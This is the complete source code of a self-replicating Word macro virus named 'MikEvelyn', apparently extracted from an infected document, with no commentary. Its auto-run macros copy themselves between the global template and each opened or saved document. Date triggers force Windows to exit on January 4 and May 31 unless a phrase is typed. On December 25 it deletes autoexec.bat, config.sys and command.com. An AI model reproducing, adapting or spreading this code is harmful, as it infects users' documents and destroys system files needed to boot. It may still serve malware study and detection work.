   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "MikEvelyn"

   Public Sub MAIN()
   Dim vinstalled
   Dim i
   Dim inp$
   vinstalled = 0
   For i = 1 To WordBasic.CountMacros(0, 0)
       If WordBasic.[MacroName$](i, 0, 0) = "MikEvelyn" Then
           vinstalled = 1
       End If
   Next i

   If vinstalled = 1 Then
       GoTo finish1
   Else
       On Error Resume Next
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen", 1
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoNew", "Global:AutoNew", 1
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Global:AutoClose", 1
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoSave", "Global:AutoSave", 1
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoExec", "Global:AutoExec", 1
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":ToolsMacro", "Global:ToolsMacro", 1
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":MikEvelyn", "Global:MikEvelyn", 1
   End If
   finish1:
   vinstalled = 0
   On Error GoTo -1: On Error GoTo finish2

   For i = 1 To WordBasic.CountMacros(1, 0)
       If WordBasic.[MacroName$](i, 1, 0) = "MikEvelyn" Then
           vinstalled = 1
       End If
   Next i

   If vinstalled = 1 Then
       GoTo finish2
   Else
       On Error Resume Next
       WordBasic.FileSaveAs Format:=1
       WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 1
       WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", 1
       WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", 1
       WordBasic.MacroCopy "Global:AutoSave", WordBasic.[FileName$]() + ":AutoSave", 1
       WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":AutoExec", 1
       WordBasic.MacroCopy "Global:ToolsMacro", WordBasic.[FileName$]() + ":ToolsMacro", 1
       WordBasic.MacroCopy "Global:MikEvelyn", WordBasic.[FileName$]() + ":MikEvelyn", 1
       WordBasic.FileSaveAll 1, 0
   End If
   finish2:

   If WordBasic.Month(WordBasic.Now()) = 1 And WordBasic.Day(WordBasic.Now()) = 4 Then
   inp$ = WordBasic.[InputBox$]("Type Happy Anniversary MikEvelyn", "MikEvelyn")
       If inp$ <> "Happy Anniversary MikEvelyn" Then
           WordBasic.ExitWindows
       End If
   End If
   If WordBasic.Month(WordBasic.Now()) = 5 And WordBasic.Day(WordBasic.Now()) = 31 Then
   inp$ = WordBasic.[InputBox$]("Type Happy Birthday Edison", "Edison")
       If inp$ <> "Happy Birthday Edison" Then
           WordBasic.ExitWindows
       End If
   End If
   If WordBasic.Month(WordBasic.Now()) = 12 And WordBasic.Day(WordBasic.Now()) = 25 Then
       On Error Resume Next
       WordBasic.Kill "c:\autoexec.bat"
       WordBasic.Kill "c:\config.sys"
       WordBasic.Kill "c:\command.com"
       WordBasic.MsgBox "Do you know that Christmas is a PAGAN PRACTICE?"
   End If


   End Sub

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   WordBasic.Call "MikEvelyn"
   End Sub

   Attribute VB_Name = "AutoSave"

   Public Sub MAIN()
   WordBasic.Call "MikEvelyn"
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   WordBasic.Call "MikEvelyn"
   End Sub

   Attribute VB_Name = "AutoExec"

   Public Sub MAIN()
   WordBasic.Call "MikEvelyn"
   End Sub

   Attribute VB_Name = "AutoNew"

   Public Sub MAIN()
   WordBasic.Call "MikEvelyn"
   End Sub
